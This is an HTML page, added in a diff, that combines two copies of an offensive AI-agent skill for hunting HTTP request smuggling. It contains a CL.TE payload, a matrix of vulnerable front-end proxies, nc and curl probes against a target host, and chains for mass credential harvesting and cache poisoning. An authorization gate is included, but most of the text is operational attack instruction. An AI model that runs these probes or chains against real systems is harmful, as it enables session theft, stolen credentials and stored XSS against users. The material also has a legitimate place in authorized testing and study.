@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-http-smuggling</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">http-request-smuggling</a> / hunt-http-smuggling</p><h1>hunt-http-smuggling</h1><p class="meta">combined</p><p>Both copies share the same core smuggling matrix, CL.TE example, and H2.CL guidance, but each contains material steps the other lacks. The uphiago copy adds a CL.0 desync section with raw-socket and curl probes, while the sickn33 copy adds a mandatory authorization gate, an Apache mod_proxy_ajp row, and a mass credential harvesting chain. Crowning one would hide these real alternatives.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-http-smuggling/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-http-smuggling/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-http-smuggling/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-http-smuggling/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-http-smuggling/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-http-smuggling/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-http-smuggling
+description: &quot;Hunt HTTP request smuggling (CL.TE, TE.CL, H2.CL, H2.TE, CL.0, AJP desync).&quot;
+category: security
+risk: offensive
+license: MIT
+---
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## HTTP REQUEST SMUGGLING
+&gt; Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.
+
+### CL.TE (Content-Length front, Transfer-Encoding back)
+```http
+POST / HTTP/1.1
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+### Detection
+```
+1. Burp extension: HTTP Request Smuggler
+2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
+3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
+```
+
+### Impact Chain
+```
+Poison next request → access admin as victim
+Steal credentials → capture victim&#x27;s session
+Cache poisoning → stored XSS at scale
+```
+
+---
+
+## Target-Suitability Matrix (2026 reality check)
+
+The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.
+
+| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
+|---|---|---|---|---|---|
+| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. |
+| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
+| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
+| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
+| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
+| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
+| **Older F5 BIG-IP (TMM &lt; 16)** | ✓ | — | — | — | Vendor advisories |
+| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
+| **Squid 3.x** | ✓ | — | — | — | Older deployments |
+| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
+| **Apache mod_proxy_ajp → Tomcat** | — | — | — | — | Cross-protocol HTTP→AJP desync (CVE-2022-26377); smuggled request is opaque to the WAF and reaches internal AJP admin/status paths that lack the external auth controls |
+| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |
+
+### Operator fingerprint quick-check
+
+```bash
+curl -sI https://target/ | grep -i &quot;Server:&quot;
+```
+
+- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
+- `HAProxy`, header points to AWS/CDN → run the full payload matrix
+- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn&#x27;t 400, dig deeper
+
+### H2.CL / H2.TE (the modern dominant vector)
+
+H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2&#x27;s frame-length headers don&#x27;t survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.
+
+Tools that send HTTP/2 raw frames (Burp Pro&#x27;s HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you&#x27;ll send the wrong protocol entirely.
+
+### CL.0 Desync (Content-Length ignored by backend)
+
+Also called &quot;CL.0&quot; or &quot;ignored Content-Length&quot;. The front-end reads Content-Length and forwards the body. The backend does NOT parse Content-Length — it reads until connection close. This leaves the body bytes dangling as the start of the next request on a keep-alive connection.
+
+**Detection with raw socket:**
+
+```bash
+# CL.0 probe — send a POST with smuggled prefix after the body
+# The backend ignores CL and treats the smuggled bytes as the next request
+{
+  echo -en &#x27;POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nSMUGGL&#x27;
+  sleep 2
+  echo -en &#x27;GET /404 HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n&#x27;
+} | nc -w 10 target.com 443
+```
+
+**Curl-based blind probe:**
+
+```bash
+# CL.0 timing probe: delay on backend indicates CL ignored
+curl --max-time 30 --connect-timeout 10 -s --raw -X POST &quot;https://target.com/&quot; \
+  -H &quot;Transfer-Encoding: chunked&quot; \
+  -H &quot;Content-Length: 4&quot; \
+  -d $&#x27;x&#x27; \
+  --max-time 15 \
+  -w &quot;\nHTTP_CODE: %{http_code}\nTIME: %{time_total}\n&quot;
+```
+
+**When CL.0 is most likely:**
+- Custom Go/Python/Rust backends that use `http.Handler` with `r.Body.Read` but don&#x27;t enforce CL
+- PHP-FPM behind a proxy (PHP ignores CL on POST when `max_input_vars` not hit)
+- Server-Timing header leaks internal proxy processing
+
+**Key indicator:** A POST request with mismatched CL that does NOT return HTTP 400. The backend swallowed a wrong Content-Length without complaint.
+
+### Mass credential harvesting — the &quot;collector gadget&quot;
+The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim&#x27;s headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `hunt-ato`.
+
+---
+
+## Related Skills &amp; Chains
+
+- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.</pre>
+</body>
+</html>
